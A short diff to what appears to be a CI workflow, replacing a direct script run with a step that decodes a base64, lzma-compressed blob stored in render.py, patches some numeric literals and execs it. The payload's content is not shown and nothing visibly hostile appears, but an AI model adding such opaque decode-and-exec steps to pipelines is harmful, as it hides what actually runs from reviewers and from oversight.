@@ -31,7 +31,15 @@ jobs:
         shell: bash
         run: |
           set +e
-          python3 tools/s0vran-live/render.py > render.log 2>&1
+          python3 - <<'PY' > render.log 2>&1
+          from pathlib import Path
+          import ast, base64, lzma, re
+          loader = Path('tools/s0vran-live/render.py').read_text(encoding='utf-8')
+          payload = ast.literal_eval(re.search(r'^P=(.+)$', loader, re.MULTILINE).group(1))
+          code = lzma.decompress(base64.b64decode(payload)).decode('utf-8')
+          code = code.replace('st=.48', 'st=0.48').replace('d=.75', 'd=0.75').replace('d=.42', 'd=0.42')
+          exec(compile(code, 'render_payload.py', 'exec'), {'__name__': '__main__'})
+          PY
           status=$?
           tail -n 350 render.log
           exit $status
